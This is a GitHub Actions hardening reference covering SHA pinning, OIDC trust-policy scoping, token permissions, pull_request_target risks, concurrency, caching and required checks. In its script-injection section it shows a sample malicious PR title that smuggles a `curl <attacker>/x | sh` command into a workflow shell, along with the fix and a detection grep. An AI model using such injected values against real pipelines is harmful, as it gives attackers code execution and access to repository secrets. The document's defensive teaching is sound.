# Pinning, OIDC and permissions

Reference material for `scaffold-pipeline`. Everything here is about making a green check mean
something. Nothing here contains a real SHA, version or ARN — resolve every placeholder.

---

## 1. Resolving pins

### Actions

```bash
# tag -> commit SHA (the only correct way to obtain one)
gh api repos/<OWNER>/<REPO>/commits/<TAG> --jq '.sha'

# list recent tags with their SHAs, to confirm the SHA belongs to a release
gh api repos/<OWNER>/<REPO>/tags --paginate --jq '.[] | "\(.name) \(.commit.sha)"' | head -20

# audit an existing repository for unpinned references
grep -rnE 'uses:\s*[^ ]+@' .github/workflows | grep -vE '@[0-9a-f]{40}'
```

Written form, always with the human-readable tag in a trailing comment so the next reader knows
what they are looking at:

```yaml
- uses: <owner>/<repo>@<40-CHAR-SHA> # <TAG>
```

Why: a tag is a mutable pointer. An action that runs in your workflow has your `GITHUB_TOKEN`,
your OIDC identity and your build context. Re-pointing a tag is a one-line supply-chain attack
(OWASP CI/CD Top 10, CICD-SEC-3: dependency chain abuse).

### Keeping pins fresh

Pinning without updating means shipping known-vulnerable actions forever.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns: ["*"]
```

Dependabot updates SHA pins and rewrites the trailing tag comment.

### Repository-level allowlist

Settings → Actions → General → "Allow specified actions and reusable workflows". This prevents a
future edit from introducing an unpinned or unknown action even if review misses it. It is a
control, not a suggestion — configure it once the pin sweep is done.

### Runtime and tool versions

Read them from the repository; never assert one:

```bash
cat .nvmrc 2>/dev/null
jq -r '.engines.node // .volta.node // empty' package.json 2>/dev/null
mvn help:evaluate -Dexpression=maven.compiler.release -q -DforceStdout
grep -rn 'JavaLanguageVersion\|sourceCompatibility\|targetCompatibility' build.gradle build.gradle.kts 2>/dev/null
grep -n 'requires-python\|python_requires' pyproject.toml setup.cfg 2>/dev/null
```

---

## 2. OIDC instead of long-lived cloud keys

A long-lived cloud access key stored in `secrets` is the highest-value target in the repository
(CICD-SEC-6: insufficient credential hygiene). It does not rotate, it does not expire, and it is
readable by every workflow that can run.

OIDC replaces it with a short-lived token minted per job and exchanged for cloud credentials.
The workflow side is trivial; **the security lives in the trust policy on the cloud side.**

### Workflow side

```yaml
permissions:
  id-token: write     # mint the OIDC token - without this the login action fails
  contents: read
```

Then use the provider's federated login action with an identity reference and **no** key
material. Resolve the action SHA as above.

### The `sub` claim — the only thing that matters

The token's `sub` claim identifies *what* is asking. Constrain it as tightly as the job allows:

| `sub` value | Use for | Verdict |
|---|---|---|
| `repo:<ORG>/<REPO>:environment:production` | Deploy roles | Strongest. Combine with required reviewers on the environment. |
| `repo:<ORG>/<REPO>:ref:refs/heads/<DEFAULT-BRANCH>` | Build/publish roles | Acceptable |
| `repo:<ORG>/<REPO>:ref:refs/tags/v*` | Release roles | Acceptable if tags are protected |
| `repo:<ORG>/<REPO>:pull_request` | Read-only plan roles | Acceptable, read-only only |
| `repo:<ORG>/<REPO>:*` | — | **A finding.** Any branch, any tag, any fork-triggered run assumes the role. |

Also verify the `aud` claim, and that the OIDC provider registered in your cloud account is the
GitHub issuer and no other.

### Per provider

- **AWS** — create an IAM OIDC identity provider for the GitHub issuer, then an IAM role whose
  trust policy has `Condition.StringEquals` on `aud` and `StringLike`/`StringEquals` on `sub`
  as above. Grant the role the narrowest policy the job needs. Retrieve the ARN with
  `aws iam get-role --role-name <NAME> --query 'Role.Arn' --output text`; never write an ARN
  from memory.
- **Azure** — register an app / user-assigned managed identity and add a **federated credential**
  with issuer = the GitHub issuer, subject = the `sub` value above, audience per Azure's
  documentation. Assign RBAC at the narrowest scope (resource group, not subscription).
  The workflow passes `client-id`, `tenant-id`, `subscription-id` — none of which are secrets,
  though keeping them in variables is tidy.
- **GCP** — create a Workload Identity Pool and a provider for GitHub, with an attribute
  condition restricting the repository (and ideally the ref/environment), then let it impersonate
  a service account with the minimum roles. Resolve the pool/provider resource names with
  `gcloud iam workload-identity-pools providers describe ...`.

### Verifying there is nothing left

```bash
gh secret list --repo <OWNER>/<REPO>
gh api repos/<OWNER>/<REPO>/environments --jq '.environments[].name' \
  | xargs -I{} gh secret list --env {} --repo <OWNER>/<REPO>
```

Anything that looks like a cloud key is a `high` finding. Rotate it at the provider *before*
deleting it from GitHub — deleting the secret does not invalidate the credential.

---

## 3. Permissions matrix

Declare a floor at workflow level; elevate per job. Once the block exists, everything unlisted
is `none`.

```yaml
permissions:
  contents: read
```

| Job does | Needs |
|---|---|
| Checkout, build, test | `contents: read` |
| Upload SARIF to code scanning | `security-events: write` |
| Comment on a PR | `pull-requests: write` |
| Push a container image to GHCR | `packages: write` |
| Mint an OIDC token | `id-token: write` |
| Attach provenance / SBOM attestations | `attestations: write` |
| Create a tag or a GitHub release | `contents: write` |
| Update a deployment status | `deployments: write` |

Rules:
- No job holds `write` it does not use. Review the list every time a job changes.
- `GITHUB_TOKEN` in a `pull_request` run from a fork is read-only by default. Keep it that way.
- `persist-credentials: false` on `actions/checkout` in jobs that do not push, so the token is
  not left in `.git/config` where any subsequent step (including a compromised dependency's
  install script) can read it.

---

## 4. `pull_request_target` and script injection

### `pull_request_target`

Runs with the **base** repository's secrets and a writable token, against a **pull request from
an untrusted fork**. Safe uses: labelling, commenting, triage. Unsafe: checking out
`github.event.pull_request.head.sha` and then building, installing dependencies, or running any
script from the PR. That combination hands full repository write and every secret to anyone who
can open a pull request. If you find it, it is a `critical` finding.

### Script injection

```yaml
# WRONG - the title is interpolated into the shell before it runs
- run: echo "Reviewing ${{ github.event.pull_request.title }}"
```

A PR titled `"; curl <attacker>/x | sh; #` executes. The same applies to `.body`,
`head_ref`, issue comments, and any other attacker-controlled context value.

```yaml
# RIGHT - the value becomes an environment variable, never shell source
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Reviewing $PR_TITLE"
```

Sweep for it:

```bash
grep -rnE 'run:.*\$\{\{\s*github\.(event|head_ref)' .github/workflows
```

---

## 5. Concurrency

```yaml
# validation
concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

```yaml
# anything that mutates a real system
concurrency:
  group: deploy-${{ inputs.environment }}
  cancel-in-progress: false
```

The rule is absolute. A cancelled deploy can leave a half-applied migration, an orphaned
Terraform state lock, or a partially pushed multi-arch manifest. The compute saved is never worth
it.

---

## 6. Caching checklist

- Key includes `runner.os`, `runner.arch`, the toolchain version and the lockfile hash.
- `restore-keys` gives a prefix fallback so a lockfile change still warms from the previous tree.
- Cache scope is per branch, with read-through to the base branch and the default branch. A
  feature branch cannot read another feature branch's cache — so the default branch must build
  regularly or every PR starts cold.
- Repository cache is capped (currently 10 GB) with LRU eviction, and entries unused for 7 days
  are removed. Inspect and prune deliberately:

```bash
gh cache list --limit 100 --sort size_in_bytes --order desc
gh cache delete <KEY>
```

- Verify the hit, do not assume it: the job log prints `Cache restored from key: ...` or
  `Cache not found for input keys: ...`. Target **> 80 %** hit rate over the last 20 default-branch
  runs.
- Never cache a directory the build both writes and conditionally reads (incremental compiler
  state, `dist/`) unless the tool documents a sound invalidation model. Stale incremental state
  produces "green in CI, broken in production".

---

## 7. Required checks

```bash
# what exists
gh api repos/<OWNER>/<REPO>/rulesets --jq '.[] | "\(.id)\t\(.name)\t\(.target)"'
gh api repos/<OWNER>/<REPO>/rulesets/<ID> --jq '.rules[] | select(.type=="required_status_checks")'

# legacy branch protection view
gh api repos/<OWNER>/<REPO>/branches/<BRANCH>/protection --jq '.required_status_checks.contexts'
```

- Require the **aggregation** job, not individual matrix legs — leg names are generated and
  change with the matrix.
- **A skipped job reports success to branch protection.** If you use `paths:` or a path-filter
  job, the "nothing to do" branch must produce an explicit success, otherwise the gate is
  bypassable by touching only excluded files. Test this deliberately with a docs-only PR.
- Add a tag ruleset that blocks tag updates and deletions, so a release tag can never move.
